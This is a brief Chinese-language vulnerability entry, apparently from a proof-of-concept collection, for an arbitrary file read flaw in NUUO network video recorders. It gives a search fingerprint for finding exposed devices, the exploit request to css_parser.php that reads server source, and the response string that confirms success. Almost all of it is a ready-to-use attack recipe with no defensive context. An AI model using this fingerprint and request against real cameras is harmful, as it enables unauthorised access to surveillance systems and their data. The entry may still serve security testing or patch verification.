# NUUO摄像头存在任意文件读取漏洞

NUUO ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="Network Video Recorder Login"`
- **请求**：`GET /css_parser.php?css=css_parser.php HTTP/1.1`
- **响应特征**：200 $filename=$_GET